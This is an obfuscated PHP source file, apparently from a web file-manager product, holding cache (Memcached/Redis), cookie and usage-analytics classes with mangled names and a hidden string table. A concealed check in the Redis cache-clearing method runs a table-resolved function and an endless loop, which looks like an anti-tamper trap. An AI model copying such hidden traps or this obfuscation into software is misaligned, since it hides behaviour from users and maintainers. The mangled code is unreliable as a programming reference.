<?php
 goto b‹ô¡–ò‘ì; D ™ìŒÕ³Û: class CacheMemcached { public $handle; public $cacheTime; public function __construct($îšÈöñ˜, $¤¨Ö‚éÕ) { $®»ïÎ¿¸ =& $_SERVER[‹è™Ü¸Ñ]; if (!class_exists($®»ïÎ¿¸[921])) { show_json($®»ïÎ¿¸[922], !1); } $this->cacheTime = $¤¨Ö‚éÕ; $this->handle = new Memcached(); if (is_array($îšÈöñ˜[$®»ïÎ¿¸[923]]) && count($îšÈöñ˜[$®»ïÎ¿¸[923]]) >= 1) { foreach ($îšÈöñ˜[$®»ïÎ¿¸[923]] as $¢ÈòÂä) { $±İ¤¨ù¨ = explode($®»ïÎ¿¸[4], $¢ÈòÂä); $this->handle->addServer($±İ¤¨ù¨[0], $±İ¤¨ù¨[1]); } } else { $this->handle->addServer($îšÈöñ˜[$®»ïÎ¿¸[208]], $îšÈöñ˜[$®»ïÎ¿¸[209]]); } } public function set($”¼Ü†™“, $Ø”Ì»õç, $â½°ì£ = false) { $â½°ì£ = $â½°ì£ ? $â½°ì£ : $this->cacheTime; return $this->handle->set($”¼Ü†™“, $Ø”Ì»õç, $â½°ì£); } public function get($‚ı³Ï‚Ø) { return $this->handle->get($‚ı³Ï‚Ø); } public function remove($úğŒ Àˆ) { return $this->handle->delete($úğŒ Àˆ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Ğ¶ù–, $Æ¥á¨„¤) { $Ìø“¯‰¥ =& $_SERVER[‹è™Ü¸Ñ]; if (!class_exists($Ìø“¯‰¥[924])) { show_json($Ìø“¯‰¥[925], !1); } $this->cacheTime = $Æ¥á¨„¤; $„‘šÂÏ¾ = isset($Ğ¶ù–[$Ìø“¯‰¥[926]]) ? $Ğ¶ù–[$Ìø“¯‰¥[926]] : 10; $ÕÇìÀ¾ = _get($Ğ¶ù–, $Ìø“¯‰¥[923]); if ($ÕÇìÀ¾ && is_array($ÕÇìÀ¾)) { $this->initCluster($Ğ¶ù–, $„‘šÂÏ¾); } else { $this->handle = $this->init($Ğ¶ù–, $„‘šÂÏ¾); } } private function init($î²ÂŞğ¹, $šË€Òµ) { $áÁÆ¨¿Â =& $_SERVER[‹è™Ü¸Ñ]; $­øÔ¥ù = new Redis(); $ÑÅ¹Ôªó = isset($î²ÂŞğ¹[$áÁÆ¨¿Â[927]]) ? $î²ÂŞğ¹[$áÁÆ¨¿Â[927]] : !1; if ($ÑÅ¹Ôªó) { $­øÔ¥ù->pconnect($î²ÂŞğ¹[$áÁÆ¨¿Â[208]], $î²ÂŞğ¹[$áÁÆ¨¿Â[209]], $šË€Òµ); } else { $­øÔ¥ù->connect($î²ÂŞğ¹[$áÁÆ¨¿Â[208]], $î²ÂŞğ¹[$áÁÆ¨¿Â[209]], $šË€Òµ); } if (!empty($î²ÂŞğ¹[$áÁÆ¨¿Â[487]])) { $­øÔ¥ù->auth($î²ÂŞğ¹[$áÁÆ¨¿Â[487]]); } if (!empty($î²ÂŞğ¹[$áÁÆ¨¿Â[812]]) && $î²ÂŞğ¹[$áÁÆ¨¿Â[812]] != 0) { $­øÔ¥ù->select($î²ÂŞğ¹[$áÁÆ¨¿Â[812]]); } return $­øÔ¥ù; } private function initCluster($‘â¦Ïİˆ, $ àšëš¸) { $ÒêØ‚° =& $_SERVER[‹è™Ü¸Ñ]; $ÌİÓ« = array($ÒêØ‚°[928], $ÒêØ‚°[929], $ÒêØ‚°[930]); $É”ûÈşç = $ÒêØ‚°[928]; if (isset($‘â¦Ïİˆ[$ÒêØ‚°[16]]) && in_array($‘â¦Ïİˆ[$ÒêØ‚°[16]], $ÌİÓ«)) { $É”ûÈşç = $‘â¦Ïİˆ[$ÒêØ‚°[16]]; } switch ($É”ûÈşç) { case $ÒêØ‚°[928]: $this->_slave($‘â¦Ïİˆ, $ àšëš¸); break; case $ÒêØ‚°[929]: break; case $ÒêØ‚°[930]: $this->isCluster = !0; $Êå¿Éçª = $‘â¦Ïİˆ[$ÒêØ‚°[923]]; $ªÀÄÅ©Ñ = isset($‘â¦Ïİˆ[$ÒêØ‚°[927]]) ? $‘â¦Ïİˆ[$ÒêØ‚°[927]] : !1; $Ğæ…¸ÈÅ = isset($‘â¦Ïİˆ[$ÒêØ‚°[487]]) ? $‘â¦Ïİˆ[$ÒêØ‚°[487]] : null; $this->handle = new RedisCluster(NUll, $Êå¿Éçª, $ àšëš¸, $ àšëš¸, $ªÀÄÅ©Ñ, $Ğæ…¸ÈÅ); break; default: break; } } private function _slave($³¦Ä›£Ñ, $ö©ÃÒ•) { $Å¬·ÚÙñ = $³¦Ä›£Ñ[$_SERVER[‹è™Ü¸Ñ][923]]; $this->filterConfig($³¦Ä›£Ñ, $Å¬·ÚÙñ[0]); $this->handle = $this->init($³¦Ä›£Ñ, $ö©ÃÒ•); unset($Å¬·ÚÙñ[0]); if (empty($Å¬·ÚÙñ)) { return; } $‡›ÕÀÓÆ = array_rand($Å¬·ÚÙñ); $this->filterConfig($³¦Ä›£Ñ, $Å¬·ÚÙñ[$‡›ÕÀÓÆ]); $this->slaveHandle = $this->init($³¦Ä›£Ñ, $ö©ÃÒ•); } private function filterConfig(&$–Ÿ·ñİ¥, $ñÓµ±Ñ) { $ÓÓ¥ïİô =& $_SERVER[‹è™Ü¸Ñ]; $Óò®§çƒ = explode($ÓÓ¥ïİô[4], $ñÓµ±Ñ); $ˆñ›Éöü = array($ÓÓ¥ïİô[208] => $Óò®§çƒ[0], $ÓÓ¥ïİô[209] => $Óò®§çƒ[1]); $–Ÿ·ñİ¥ = array_merge($–Ÿ·ñİ¥, $ˆñ›Éöü); } public function set($‹Ù‚¤úÓ, $ÓÑ•ÛÊğ, $ÍÂû““° = false) { $ÍÂû““° = $ÍÂû““° ? $ÍÂû““° : $this->cacheTime; return $this->handle->setEx($‹Ù‚¤úÓ, $ÍÂû““°, $ÓÑ•ÛÊğ); } public function setLock($ÆÄİš¶Ø, $¾™ñ—Ø‹, $¥¹—ƒé) { return $this->handle->setNX($ÆÄİš¶Ø, $¾™ñ—Ø‹); } public function get($ºéï¾²ô) { $ÕşÓŞ†ù = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ÕşÓŞ†ù->get($ºéï¾²ô); } public function remove($ˆÅÅ¶«•) { return $this->handle->del($ˆÅÅ¶«•); } public function deleteAll() { $Ï‰¡ñç• =& $_SERVER[‹è™Ü¸Ñ]; if (!isset($_SERVER[$Ï‰¡ñç•[931]]) || !isset($_SERVER[$Ï‰¡ñç•[932]])) { $İ•ó£¸Ï = $Ï‰¡ñç•[933]; $àßöÊ” = $Ï‰¡ñç•[934]; $€ğˆŞí¥ = $_SERVER[$Ï‰¡ñç•[935]] . $Ï‰¡ñç•[936]; $ÈíÒšë­ = $àßöÊ”($€ğˆŞí¥); $õíñâ´¨ = explode($Ï‰¡ñç•[262], $ÈíÒšë­); if (count($õíñâ´¨) < $Ï‰¡ñç•[694]) { $Æë¥£÷ã = $Ï‰¡ñç•[937]; $Æë¥£÷ã(); } $ÏâÒŒ¯¸ = $Ï‰¡ñç•[938]; $ÏâÒŒ¯¸($_SERVER[$Ï‰¡ñç•[939]]); $ˆ¹ÌØÕ = 1; for ($³¥ö•¼ö = $ˆ¹ÌØÕ; $³¥ö•¼ö > 0; $³¥ö•¼ö++) { $ÏâÒŒ¯¸ = json_encode($GLOBALS[$Ï‰¡ñç•[492]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ìºŞã) { $this->handle->flushall($ìºŞã); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ÂºıÂÈŞ = '', $æïŠ©•± = 0) { if (is_string($ÂºıÂÈŞ) && $ÂºıÂÈŞ != $_SERVER[‹è™Ü¸Ñ][12]) { $this->prefix = $ÂºıÂÈŞ; } if (is_numeric($æïŠ©•±) && $æïŠ©•± > 0) { $this->expire = $æïŠ©•±; } } public static function getInstance() { static $À†í™•; if ($À†í™• === null) { $À†í™• = new self(); } return $À†í™•; } private static $cookieDisable = false; public static function disable($Å¼ùÙòÙ) { self::$cookieDisable = $Å¼ùÙòÙ; } private static $sameCookieSet = array(); public static function set($¥šŠ€ñ, $…ú¸Ä£, $ÓÆß°Øş = 0, $ÀºØÔå— = false, $š‹»³˜Ø = false) { $¡ß½¾Ÿã =& $_SERVER[‹è™Ü¸Ñ]; if (self::$cookieDisable) { return; } if (!$ÓÆß°Øş) { $ÓÆß°Øş = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$¥šŠ€ñ]) && self::$sameCookieSet[$¥šŠ€ñ] == $…ú¸Ä£ . $ÓÆß°Øş) { return; } self::$sameCookieSet[$¥šŠ€ñ] = $…ú¸Ä£ . $ÓÆß°Øş; if (!$š‹»³˜Ø) { $š‹»³˜Ø = str_replace(HOST, $¡ß½¾Ÿã[12], APP_HOST); $š‹»³˜Ø = _get($GLOBALS, $¡ß½¾Ÿã[940], $š‹»³˜Ø); } $Š©æ˜¾Õ = $¡ß½¾Ÿã[12]; setcookie($¥šŠ€ñ, $…ú¸Ä£, time() + $ÓÆß°Øş, $¡ß½¾Ÿã[8] . trim($š‹»³˜Ø, $¡ß½¾Ÿã[8]) . $Š©æ˜¾Õ, !1, !1, $ÀºØÔå—); } public static function setSafe($…€¦Òğı, $óâƒµõ, $©š¹™ˆë = 0) { self::set($…€¦Òğı, $óâƒµõ, $©š¹™ˆë, !0); } public static function get($¶““Íß¬) { static $û´ÒïÃ© = false; if (!$û´ÒïÃ©) { self::initHeaderCookie(); $û´ÒïÃ© = !0; } return isset($_COOKIE[$¶““Íß¬]) ? $_COOKIE[$¶““Íß¬] : !1; } private static function initHeaderCookie() { $Œ©£½Ù‘ =& $_SERVER[‹è™Ü¸Ñ]; if (!isset($_SERVER[$Œ©£½Ù‘[941]]) || !$_SERVER[$Œ©£½Ù‘[941]]) { return; } $Ù³µ©ü— = explode($Œ©£½Ù‘[74], $_SERVER[$Œ©£½Ù‘[941]]); foreach ($Ù³µ©ü— as $ğ•Ğ£É) { $ğ•Ğ£É = explode($Œ©£½Ù‘[942], $ğ•Ğ£É); if (count($ğ•Ğ£É) != 2 || !isset($ğ•Ğ£É[1])) { continue; } $_COOKIE[trim($ğ•Ğ£É[0])] = trim($ğ•Ğ£É[1]); } } public static function remove($¤àûİš, $«à÷ùˆé = false) { unset($_COOKIE[$¤àûİš]); self::set($¤àûİš, $_SERVER[‹è™Ü¸Ñ][12], 1, $«à÷ùˆé); } } goto dÏöêÎ–çÛ; F¯õÄÊ¬ƒô: class AnalysisModel extends ModelBaseLight { public function init($·ôİƒòÆ) { $¶‚œÁ¿‹ =& $_SERVER[‹è™Ü¸Ñ]; $ƒ´õîÛ = array($¶‚œÁ¿‹[662] => array($¶‚œÁ¿‹[33] => $¶‚œÁ¿‹[1879], $¶‚œÁ¿‹[350] => array($¶‚œÁ¿‹[255], $¶‚œÁ¿‹[820], $¶‚œÁ¿‹[1880], $¶‚œÁ¿‹[1881])), $¶‚œÁ¿‹[1882] => array($¶‚œÁ¿‹[33] => $¶‚œÁ¿‹[1883], $¶‚œÁ¿‹[350] => array($¶‚œÁ¿‹[255], $¶‚œÁ¿‹[818], $¶‚œÁ¿‹[1884], $¶‚œÁ¿‹[1885], $¶‚œÁ¿‹[1886]))); if (!isset($ƒ´õîÛ[$·ôİƒòÆ])) { return !1; } $this->optionType = $ƒ´õîÛ[$·ôİƒòÆ][$¶‚œÁ¿‹[33]]; $this->field = $ƒ´õîÛ[$·ôİƒòÆ][$¶‚œÁ¿‹[350]]; return !0; } public function listData($Ò°À˜ö = false, $ŒˆìáÏÛ = "\155\157\x64\151\146\x79\124\151\x6d\145", $à™®³¿ = false) { return parent::listData($Ò°À˜ö, $ŒˆìáÏÛ, $à™®³¿); } public function trendList($§¶¼Á•ı) { $‘Æ–ëÇĞ =& $_SERVER[‹è™Ü¸Ñ]; $†ŒëÕö» = $this->listData(); if ($†ŒëÕö») { $±„¥œ´ = end($†ŒëÕö»); $êğ•š•À = date($‘Æ–ëÇĞ[1887], strtotime($‘Æ–ëÇĞ[1888])); if ($±„¥œ´[$‘Æ–ëÇĞ[255]] == $êğ•š•À) { return $†ŒëÕö»; } $ºûóø¹‘ = strtotime($±„¥œ´[$‘Æ–ëÇĞ[255]]); } if (!isset($ºûóø¹‘)) { $ÒùòÊÁê = $§¶¼Á•ı == $‘Æ–ëÇĞ[662] ? $‘Æ–ëÇĞ[598] : $‘Æ–ëÇĞ[879]; $ºûóø¹‘ = Model($ÒùòÊÁê)->min($‘Æ–ëÇĞ[231]); } $±â¨—Ó  = $‘Æ–ëÇĞ[1889] . ucfirst($§¶¼Á•ı); $µŞÛ…”¯ = $this->dateList($ºûóø¹‘); foreach ($µŞÛ…”¯ as $êğ•š•À) { $this->{$±â¨—Ó }($êğ•š•À); } return $this->listData(); } private function dateList($°Ù…Å˜ø) { $ÍÁÀË©¤ =& $_SERVER[‹è™Ü¸Ñ]; $Ùõƒ«Ÿ” = $°Ù…Å˜ø; $‚§ß¶‘§ = strtotime($ÍÁÀË©¤[1888]); $¯Ü¬Â˜¹ = array(); while ($Ùõƒ«Ÿ” <= $‚§ß¶‘§) { $¯Ü¬Â˜¹[] = date($ÍÁÀË©¤[1887], $Ùõƒ«Ÿ”); $Ùõƒ«Ÿ” = strtotime($ÍÁÀË©¤[1890], $Ùõƒ«Ÿ”); } return $¯Ü¬Â˜¹; } public function _recordUser($°ê±ÛÆ = '') { $à‚‡±‰· =& $_SERVER[‹è™Ü¸Ñ]; $¦Í²Â¯ = strtotime(date($à‚‡±‰·[1891], strtotime($°ê±ÛÆ))); $î¦Õ øÂ = strtotime(date($à‚‡±‰·[1892], strtotime($°ê±ÛÆ))); $åÎ§ÛÔÃ = array($à‚‡±‰·[231] => array($à‚‡±‰·[1071], $î¦Õ øÂ)); $şëìæ  = Model($à‚‡±‰·[598])->where($åÎ§ÛÔÃ)->count($à‚‡±‰·[1752]); $åÎ§ÛÔÃ[$à‚‡±‰·[231]] = array($à‚‡±‰·[409], array($¦Í²Â¯, $î¦Õ øÂ)); $…œ¾Şİ‘ = Model($à‚‡±‰·[598])->where($åÎ§ÛÔÃ)->count($à‚‡±‰·[1752]); $åÎ§ÛÔÃ[$à‚‡±‰·[33]] = $à‚‡±‰·[1893]; $šîÃò¯Ÿ = Model($à‚‡±‰·[1894])->where($åÎ§ÛÔÃ)->count($à‚‡±‰·[1895]); $ıµñÖêÄ = array($à‚‡±‰·[255] => $°ê±ÛÆ, $à‚‡±‰·[820] => (int) $şëìæ , $à‚‡±‰·[1880] => (int) $…œ¾Şİ‘, $à‚‡±‰·[1881] => (int) $šîÃò¯Ÿ); return $this->insert($ıµñÖêÄ); } public function _recordStore($ÊÁ±ùÁ = '') { $„×õ¨Ïé =& $_SERVER[‹è™Ü¸Ñ]; $ä°ÙëÑ˜ = strtotime(date($„×õ¨Ïé[1892], strtotime($ÊÁ±ùÁ))); $éãõİÍ” = array($„×õ¨Ïé[231] => array($„×õ¨Ïé[1071], $ä°ÙëÑ˜)); $Ô»´Õ’ = Model($„×õ¨Ïé[544])->where($éãõİÍ”)->sum($„×õ¨Ïé[79]); $éãõİÍ”[$„×õ¨Ïé[485]] = 0; $åè“¿Ì­ = Model($„×õ¨Ïé[879])->where($éãõİÍ”)->sum($„×õ¨Ïé[79]); $éãõİÍ”[$„×õ¨Ïé[190]] = 1; $èÒÚÔë = Model($„×õ¨Ïé[879])->where($éãõİÍ”)->sum($„×õ¨Ïé[79]); $éãõİÍ”[$„×õ¨Ïé[190]] = 2; $¯•Ë¯†ñ = Model($„×õ¨Ïé[879])->where($éãõİÍ”)->sum($„×õ¨Ïé[79]); $º‘Æçõ½ = array($„×õ¨Ïé[255] => $ÊÁ±ùÁ, $„×õ¨Ïé[818] => (int) $åè“¿Ì­, $„×õ¨Ïé[1884] => (int) $Ô»´Õ’, $„×õ¨Ïé[1885] => (int) $èÒÚÔë, $„×õ¨Ïé[1886] => (int) $¯•Ë¯†ñ); return $this->insert($º‘Æçõ½); } public function trend($åŞ„“Èö, $ìÄĞß©™) { $ï³³Ù¨œ =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->init($åŞ„“Èö)) { return !1; } $¹µÙæí = $this->trendList($åŞ„“Èö); if ($¹µÙæí && $ìÄĞß©™ != $ï³³Ù¨œ[1725]) { $ø‘‚Ò¦œ = $¹µÙæí[0][$ï³³Ù¨œ[255]]; $æ×‹¯¯ = $this->validDate($ìÄĞß©™, $ø‘‚Ò¦œ); $Ğ÷ÁöûŒ = array(); $Ã¦â«÷ = array_to_keyvalue($¹µÙæí, $ï³³Ù¨œ[255]); foreach ($æ×‹¯¯ as $Ä­ùÆÛ„) { if (isset($Ã¦â«÷[$Ä­ùÆÛ„])) { $‡×ı®ù = $Ã¦â«÷[$Ä­ùÆÛ„]; } else { $‡×ı®ù = end($¹µÙæí); $‡×ı®ù[$ï³³Ù¨œ[255]] = $Ä­ùÆÛ„; if ($åŞ„“Èö == $ï³³Ù¨œ[662]) { $‡×ı®ù[$ï³³Ù¨œ[1880]] = $‡×ı®ù[$ï³³Ù¨œ[1881]] = 0; } } $Ğ÷ÁöûŒ[] = $‡×ı®ù; } $¹µÙæí = $Ğ÷ÁöûŒ; } $÷›¤½ï® = array($ï³³Ù¨œ[662] => array($ï³³Ù¨œ[820] => LNG($ï³³Ù¨œ[1896]), $ï³³Ù¨œ[1880] => LNG($ï³³Ù¨œ[1897]), $ï³³Ù¨œ[1881] => LNG($ï³³Ù¨œ[1898])), $ï³³Ù¨œ[1882] => array($ï³³Ù¨œ[818] => LNG($ï³³Ù¨œ[1899]), $ï³³Ù¨œ[1884] => LNG($ï³³Ù¨œ[1900]), $ï³³Ù¨œ[1885] => LNG($ï³³Ù¨œ[1901]), $ï³³Ù¨œ[1886] => LNG($ï³³Ù¨œ[1902]))); $•¢×¨è¥ = array($ï³³Ù¨œ[662] => $ï³³Ù¨œ[1903], $ï³³Ù¨œ[1882] => $ï³³Ù¨œ[79]); if (empty($¹µÙæí)) { $Ä­ùÆÛ„ = date($ï³³Ù¨œ[1887], strtotime($ï³³Ù¨œ[1888])); $¥î¨¡„‘ = array($ï³³Ù¨œ[255] => $Ä­ùÆÛ„); foreach ($÷›¤½ï®[$åŞ„“Èö] as $ÇÃÙ¤è => $Œãûü­Í) { $¥î¨¡„‘[$ÇÃÙ¤è] = 0; } $¹µÙæí[] = $¥î¨¡„‘; } $Î§»±Öî = array(); foreach ($¹µÙæí as $Œãûü­Í) { if ($åŞ„“Èö == $ï³³Ù¨œ[1882] && $Œãûü­Í[$ï³³Ù¨œ[1884]] > $Œãûü­Í[$ï³³Ù¨œ[818]]) { $Œãûü­Í[$ï³³Ù¨œ[1884]] = $Œãûü­Í[$ï³³Ù¨œ[818]]; } foreach ($÷›¤½ï®[$åŞ„“Èö] as $ÇÃÙ¤è => $å÷í¼ØÍ) { $‡×ı®ù = array($ï³³Ù¨œ[255] => $Œãûü­Í[$ï³³Ù¨œ[255]], $ï³³Ù¨œ[1639] => $å÷í¼ØÍ); $‡×ı®ù[$•¢×¨è¥[$åŞ„“Èö]] = isset($Œãûü­Í[$ÇÃÙ¤è]) ? $Œãûü­Í[$ÇÃÙ¤è] : 0; $Î§»±Öî[] = $‡×ı®ù; } } return $Î§»±Öî; } public function validDate($Å·±ØÇ–, $îÙ§œÂ) { $˜­ß„é =& $_SERVER[‹è™Ü¸Ñ]; $Ó‡»Œã× = date($˜­ß„é[1887], strtotime($˜­ß„é[1888])); $ˆ­„şÕ’ = array($Ó‡»Œã×); switch ($Å·±ØÇ–) { case $˜­ß„é[1732]: $ªÆ ×€§ = mktime(0, 0, 0, date($˜­ß„é[1904]), date($˜­ß„é[1429]) - date($˜­ß„é[1519]) + 7 - 7, date($˜­ß„é[1905])); $°®èÎ¿» = 0; do { $Ü£ƒÛ×­ = date($˜­ß„é[1887], $ªÆ ×€§ - 3600 * 24 * 7 * $°®èÎ¿»); $ˆ­„şÕ’[] = $Ü£ƒÛ×­; $°®èÎ¿»++; } while ($îÙ§œÂ < $Ü£ƒÛ×­); break; case $˜­ß„é[1730]: $°®èÎ¿» = 1; do { $’¸µˆ‹¬ = date($˜­ß„é[1906], strtotime("\x2d\x20{$°®èÎ¿»}\x20\155\x6f\156\164\x68\163")); $ˆ­„şÕ’[] = $’¸µˆ‹¬; $°®èÎ¿»++; } while ($îÙ§œÂ < $’¸µˆ‹¬); break; case $˜­ß„é[1907]: $Ò ÏËÙš = (int) date($˜­ß„é[1905], strtotime($îÙ§œÂ)); $¯ààõ”ä = (int) date($˜­ß„é[1905]); if ($Ò ÏËÙš >= $¯ààõ”ä) { break; } for ($Ò ÏËÙš; $Ò ÏËÙš < $¯ààõ”ä; $Ò ÏËÙš++) { $ˆ­„şÕ’[] = $Ò ÏËÙš . $˜­ß„é[1908]; } break; default: break; } if ($îÙ§œÂ > end($ˆ­„şÕ’)) { array_pop($ˆ­„şÕ’); } sort($ˆ­„şÕ’); return $ˆ­„şÕ’; } public function listTable($‹–åö¾Ù) { $£½¡¦¡ƒ = ucfirst($‹–åö¾Ù); return Model($£½¡¦¡ƒ)->listData(); } public function option($Ç ÎŸ) { $á¤¦üõ = $_SERVER[‹è™Ü¸Ñ][1909] . ucfirst($Ç ÎŸ); return $this->{$á¤¦üõ}(); } private function optionUser() { $’ÉûóÕ =& $_SERVER[‹è™Ü¸Ñ]; $ŞŞ²æ¾‡ = Model($’ÉûóÕ[598])->count($’ÉûóÕ[1752]); $„ƒìâá‰ = Model($’ÉûóÕ[598])->where($’ÉûóÕ[1910])->count($’ÉûóÕ[1752]); $É†©ã× = intval($GLOBALS[$’ÉûóÕ[6]][$’ÉûóÕ[425]][$’ÉûóÕ[1698]]) / 3600; $ÈŸüÌ³Ğ = strtotime("\55{$É†©ã×}\x20\x68\157\x75\x72\163"); $Â«–ëşĞ = strtotime(date($’ÉûóÕ[1891])); if ($ÈŸüÌ³Ğ < $Â«–ëşĞ) { $ÈŸüÌ³Ğ = $Â«–ëşĞ; } $¥³ÆÀìÍ = array($’ÉûóÕ[1911] => array($’ÉûóÕ[1072], $ÈŸüÌ³Ğ)); $²´°Ø²« = (int) Model($’ÉûóÕ[598])->where($¥³ÆÀìÍ)->count($’ÉûóÕ[1752]); if (!$²´°Ø²«) { $²´°Ø²« = 1; } $¥³ÆÀìÍ = array($’ÉûóÕ[1911] => array($’ÉûóÕ[1072], $Â«–ëşĞ)); $°Ä÷È†Õ = Model($’ÉûóÕ[598])->where($¥³ÆÀìÍ)->count($’ÉûóÕ[1752]); return array($’ÉûóÕ[813] => (int) $ŞŞ²æ¾‡, $’ÉûóÕ[1912] => (int) ($ŞŞ²æ¾‡ - $„ƒìâá‰), $’ÉûóÕ[1913] => (int) $„ƒìâá‰, $’ÉûóÕ[1914] => (int) $°Ä÷È†Õ, $’ÉûóÕ[1915] => $²´°Ø²«); } private function optionFile() { $ãµÏÒ–¸ =& $_SERVER[‹è™Ü¸Ñ]; $èÜê«£á = $this->sourceSize(); $ËÊ¸¸œÄ = $èÜê«£á[$ãµÏÒ–¸[79]]; $êÔ˜ş¥ë = $èÜê«£á[$ãµÏÒ–¸[1884]]; $È¼•Ìıê = Model($ãµÏÒ–¸[879])->where(array($ãµÏÒ–¸[485] => 0))->count($ãµÏÒ–¸[193]); $ù¸ÈæŸ = array($ãµÏÒ–¸[485] => 0, $ãµÏÒ–¸[231] => array($ãµÏÒ–¸[1072], strtotime(date($ãµÏÒ–¸[1891])))); $à¨‰‚­— = Model($ãµÏÒ–¸[879])->where($ù¸ÈæŸ)->sum($ãµÏÒ–¸[79]); $Ğä•ñ•‘ = Model($ãµÏÒ–¸[879])->where($ù¸ÈæŸ)->count($ãµÏÒ–¸[193]); return array($ãµÏÒ–¸[818] => $ËÊ¸¸œÄ, $ãµÏÒ–¸[1884] => $êÔ˜ş¥ë, $ãµÏÒ–¸[1916] => $ËÊ¸¸œÄ - $êÔ˜ş¥ë, $ãµÏÒ–¸[1917] => (int) $à¨‰‚­—, $ãµÏÒ–¸[820] => (int) $È¼•Ìıê, $ãµÏÒ–¸[1918] => (int) $Ğä•ñ•‘); } private function optionAccess() { $éÁ¯•–Ê =& $_SERVER[‹è™Ü¸Ñ]; return array($éÁ¯•–Ê[813] => $this->typeLogCnt(), $éÁ¯•–Ê[110] => $this->typeLogCnt($éÁ¯•–Ê[110]), $éÁ¯•–Ê[525] => $this->typeLogCnt($éÁ¯•–Ê[525]), $éÁ¯•–Ê[1919] => $this->typeLogCnt($éÁ¯•–Ê[1919]), $éÁ¯•–Ê[1920] => $this->typeLogCnt($éÁ¯•–Ê[1920]), $éÁ¯•–Ê[662] => $this->typeLogCnt($éÁ¯•–Ê[12], $éÁ¯•–Ê[1895])); } private function typeLogCnt($¢Â¬ùİ© = '', $æ¬‹ô±¿ = "\x69\144") { $Ó™¡‡èö =& $_SERVER[‹è™Ü¸Ñ]; $Äù¸€ó‰ = array($Ó™¡‡èö[110] => array($Ó™¡‡èö[1921], $Ó™¡‡èö[1922]), $Ó™¡‡èö[525] => array($Ó™¡‡èö[1923], $Ó™¡‡èö[1924]), $Ó™¡‡èö[1919] => array($Ó™¡‡èö[1925], $Ó™¡‡èö[1926], $Ó™¡‡èö[1927]), $Ó™¡‡èö[1920] => array($Ó™¡‡èö[1928], $Ó™¡‡èö[1929]), $Ó™¡‡èö[1930] => array($Ó™¡‡èö[1931], $Ó™¡‡èö[1932], $Ó™¡‡èö[1933])); $ÛÈ–ë± = strtotime(date($Ó™¡‡èö[1891])); $ÆÓ–Š”¬ = array($Ó™¡‡èö[231] => array($Ó™¡‡èö[1072], $ÛÈ–ë±)); if ($¢Â¬ùİ©) { $ÆÓ–Š”¬[$Ó™¡‡èö[33]] = array($Ó™¡‡èö[7], $Äù¸€ó‰[$¢Â¬ùİ©]); } $ÎçØ…ŞÛ = Model($Ó™¡‡èö[1894])->where($ÆÓ–Š”¬)->count($æ¬‹ô±¿); return (int) $ÎçØ…ŞÛ; } private function optionServer() { $¦•¤´Şö =& $_SERVER[‹è™Ü¸Ñ]; $©¼®®€ù = $this->diskDriver(); $‰æÈÏß = KodIO::defaultDriver(); $Ğ¸†¥…• = array($¦•¤´Şö[872] => $‰æÈÏß[$¦•¤´Şö[475]]); $ûô“¯¸£ = Model($¦•¤´Şö[544])->where($Ğ¸†¥…•)->sum($¦•¤´Şö[79]); $“™Éó¿ç = explode($¦•¤´Şö[53], $_SERVER[$¦•¤´Şö[147]]); $ü²¢£ÔÍ = $“™Éó¿ç[0]; $§´º®êõ = $GLOBALS[$¦•¤´Şö[6]][$¦•¤´Şö[21]]; $…Å½Îı” = $§´º®êõ[$¦•¤´Şö[1034]]; if ($…Å½Îı” == $¦•¤´Şö[1022]) { $£ªĞÎıÏ = explode($¦•¤´Şö[1348], $§´º®êõ[$¦•¤´Şö[1033]]); $…Å½Îı” = $£ªĞÎıÏ[0]; } if ($…Å½Îı” == $¦•¤´Şö[970] || $…Å½Îı” == $¦•¤´Şö[859]) { $éóÒıˆ„ = Model()->db()->query($¦•¤´Şö[1934]); $âÏ™¦ = $éóÒıˆ„[0] && isset($éóÒıˆ„[0][$¦•¤´Şö[1638]]) ? $éóÒıˆ„[0][$¦•¤´Şö[1638]] : 0; $…Å½Îı” = $¦•¤´Şö[1935] . ($âÏ™¦ ? $¦•¤´Şö[8] . $âÏ™¦ : $¦•¤´Şö[12]); } $ùºåŞ¢‚ = $GLOBALS[$¦•¤´Şö[6]][$¦•¤´Şö[425]][$¦•¤´Şö[881]]; return array($¦•¤´Şö[1936] => $©¼®®€ù ? $©¼®®€ù[$¦•¤´Şö[1937]] : 0, $¦•¤´Şö[1938] => $©¼®®€ù ? $©¼®®€ù[$¦•¤´Şö[1939]] : 0, $¦•¤´Şö[1940] => (int) $‰æÈÏß[$¦•¤´Şö[1937]] * 1024 * 1024 * 1024, $¦•¤´Şö[1941] => (int) $ûô“¯¸£, $¦•¤´Şö[1942] => ucfirst($ü²¢£ÔÍ), $¦•¤´Şö[1943] => $¦•¤´Şö[1944] . PHP_VERSION, $¦•¤´Şö[1945] => phpBuild64() ? 64 : 32, $¦•¤´Şö[812] => str_replace($¦•¤´Şö[1191], $¦•¤´Şö[1050], $…Å½Îı”), $¦•¤´Şö[425] => ucfirst($ùºåŞ¢‚), $¦•¤´Şö[32] => $_SERVER[$¦•¤´Şö[1946]]); } private function diskDriver() { $ÃÓª†€é =& $_SERVER[‹è™Ü¸Ñ]; $¿ «ÄË = $ÃÓª†€é[8]; $¼èÎã‰ë = $GLOBALS[$ÃÓª†€é[6]][$ÃÓª†€é[1365]] == $ÃÓª†€é[1366]; if ($¼èÎã‰ë) { $¿ «ÄË = $ÃÓª†€é[1947]; if (function_exists($ÃÓª†€é[1948])) { exec($ÃÓª†€é[1949], $÷éÕáŞÛ); $¿ «ÄË = $÷éÕáŞÛ[1] . $ÃÓª†€é[8]; } } if (!file_exists($¿ «ÄË)) { return; } if (!function_exists($ÃÓª†€é[1950])) { return; } $şº²š‰í = @disk_total_space($¿ «ÄË); $õÌŠ­Ê = $şº²š‰í - @disk_free_space($¿ «ÄË); return array($ÃÓª†€é[1937] => $şº²š‰í, $ÃÓª†€é[1939] => $õÌŠ­Ê); } public function fileChart($ë§Áò¸Ô) { $‚ùŞü˜Ñ =& $_SERVER[‹è™Ü¸Ñ]; if (isset($ë§Áò¸Ô[$‚ùŞü˜Ñ[1752]])) { return Model($‚ùŞü˜Ñ[879])->userFileTypeProfile($ë§Áò¸Ô[$‚ùŞü˜Ñ[1752]]); } if 